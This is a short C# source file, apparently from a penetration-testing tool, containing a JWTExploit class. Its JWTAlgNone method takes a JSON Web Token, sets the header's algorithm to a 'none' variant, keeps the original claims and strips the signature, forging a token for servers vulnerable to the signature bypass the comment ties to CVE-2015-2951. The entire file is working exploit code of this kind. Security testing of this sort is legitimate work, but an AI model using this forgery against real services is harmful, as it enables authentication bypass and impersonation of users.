using System;
using System.IdentityModel.Tokens.Jwt;
using System.Text;

namespace mVPenTester
{
    internal class JWTExploit {
        public string token { get; }
        public JWTExploit(string t) {
            token = t;
        }
        //JWT spec
        private static string Base64UrlEncode(byte[] input) {
            var output = Convert.ToBase64String(input);
            output = output.Split('=')[0]; //Remove any trailing '='s
            output = output.Replace('+', '-'); //62nd char of encoding
            output = output.Replace('/', '_'); //63rd char of encoding
            return output;
        }
        public string JWTAlgNone(string noneType) {
            //Checking CVE-2015-2951 where signature is not checked and algorithm is "none"
            var handler = new JwtSecurityTokenHandler();
            var decode = handler.ReadJwtToken(token);
            //Get the header and payload JSON data
            dynamic headerAlgChange = Newtonsoft.Json.JsonConvert.DeserializeObject(
                            decode.ToString().Split('.')[0]);
            //Change alg type to none type
            headerAlgChange["alg"] = noneType;
            //Convert the header JSON data to URL encoded Base64
            byte[] headerBytes = Encoding.UTF8.GetBytes(
                    Newtonsoft.Json.JsonConvert.SerializeObject(headerAlgChange));
            return Base64UrlEncode(headerBytes) + "." + token.Split('.')[1] + ".";
        }
    }
}
